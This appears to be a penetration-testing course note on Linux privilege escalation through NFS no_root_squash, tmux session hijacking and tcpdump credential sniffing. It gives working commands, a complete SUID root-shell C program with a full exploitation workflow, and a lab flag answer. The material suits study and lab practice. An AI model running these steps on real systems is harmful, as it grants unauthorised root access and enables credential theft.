# Section 18 — Miscellaneous Techniques

## ID
536

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 18 — Miscellaneous Techniques

## Description
Covers three miscellaneous privilege escalation vectors: passive traffic capture for credential sniffing, weak NFS privileges (no_root_squash) for SUID binary planting, and hijacking tmux sessions running as root.

## Tags
privesc, nfs, tmux, traffic-capture, no-root-squash, linux

## Commands
- showmount -e <TARGET_IP>
- sudo mount -t nfs <TARGET_IP>:<SHARE> /mnt
- cat /etc/exports
- gcc shell.c -o shell
- chmod u+s /mnt/shell
- tcpdump -i <INTERFACE> -w capture.pcap
- ps aux | grep tmux
- tmux -S <SOCKET_PATH>

## What This Section Covers
Three opportunistic privesc techniques that don't fit neatly into other categories. Passive traffic capture can reveal cleartext credentials or Net-NTLMv2 hashes on the wire. Weak NFS exports with `no_root_squash` let an attacker mount the share as root from their own machine and plant a SUID binary that gives root on the target. Tmux sessions running as root with group-readable sockets can be attached to directly, giving instant root access.

## Methodology

### 1. Weak NFS Privileges (no_root_squash)
1. Enumerate NFS exports from your attack box: `showmount -e <TARGET_IP>`.
2. Check the export config on the target if you have a shell: `cat /etc/exports` — look for `no_root_squash`.
3. Mount the share **as root on your attack box**: `sudo mount -t nfs <TARGET_IP>:/tmp /mnt`.
4. Compile a SUID shell binary as root:
   ```
   cat <<'EOF' > /tmp/shell.c
   #include <stdio.h>
   #include <sys/types.h>
   #include <unistd.h>
   #include <stdlib.h>
   int main(void) {
     setuid(0); setgid(0); system("/bin/bash");
   }
   EOF
   gcc /tmp/shell.c -o /tmp/shell
   ```
5. Copy it to the mounted share and set SUID: `cp /tmp/shell /mnt/shell && chmod u+s /mnt/shell`.
6. On the target as the low-priv user, execute it: `/tmp/shell` → root shell.

### 2. Hijacking Tmux Sessions
1. Check for tmux processes running as root: `ps aux | grep tmux`.
2. Find the socket path (e.g., `/shareds`) and check permissions: `ls -la /shareds`.
3. Verify your group membership includes the socket's group: `id`.
4. Attach to the session: `tmux -S /shareds` → instant root shell.

### 3. Passive Traffic Capture
1. Check if `tcpdump` is available and if you have permissions: `which tcpdump && getcap $(which tcpdump)`.
2. Capture traffic: `tcpdump -i eth0 -w /tmp/capture.pcap`.
3. Analyze with tools like `net-creds` or `PCredz` for cleartext credentials, NTLM hashes, SNMP community strings.
4. Crack any captured hashes offline with Hashcat/John.

## Multi-step Workflow (optional)
```
# NFS no_root_squash exploitation (from attack box as root)
showmount -e <TARGET_IP>
sudo mount -t nfs <TARGET_IP>:/tmp /mnt

cat <<'EOF' > /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void) {
  setuid(0); setgid(0); system("/bin/bash");
}
EOF

gcc /tmp/shell.c -o /tmp/shell
cp /tmp/shell /mnt/shell
chmod u+s /mnt/shell

# On target as low-priv user
/tmp/shell
id  # uid=0(root)
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Review the NFS server's export list and find a directory holding a flag | fc8c065b9384beaa162afe436a694acf | showmount → mount /var/nfs/general → cat exports_flag.txt |

## Key Takeaways
- **`no_root_squash` is the critical NFS misconfiguration.** By default, NFS uses `root_squash` which maps remote root to `nfsnobody` — but `no_root_squash` preserves root identity, allowing SUID binary planting from your attack box.
- The NFS SUID attack requires two machines: you compile and set SUID **as root on your attack box** (via the mount), then execute as the low-priv user on the target. The file ownership carries over because NFS trusts the UID.
- **Tmux session hijacking is instant root** if you're in the right group — no exploit needed, just `tmux -S <socket>`. Always check `ps aux | grep tmux` during enumeration.
- Passive traffic capture is situational but powerful — cleartext protocols (HTTP, FTP, Telnet, SMTP, POP, IMAP) and Net-NTLMv2 hashes can all be sniffed if tcpdump is available.
- These are all "quick win" checks to add to your enumeration checklist: `showmount -e`, `ps aux | grep tmux`, and `which tcpdump`.

## Gotchas
- NFS mounts require the `nfs-common` package on your attack box — install with `sudo apt install nfs-common` if `mount -t nfs` fails.
- The SUID binary must be compiled for the **target's architecture** — if your attack box is a different arch, cross-compile accordingly.
- Tmux socket permissions are key — you need to be in the owning group. Check with `id` and `ls -la <socket_path>`.
- Traffic capture with tcpdump may require `CAP_NET_RAW` capability or root — check with `getcap $(which tcpdump)`. Some systems grant this to regular users.
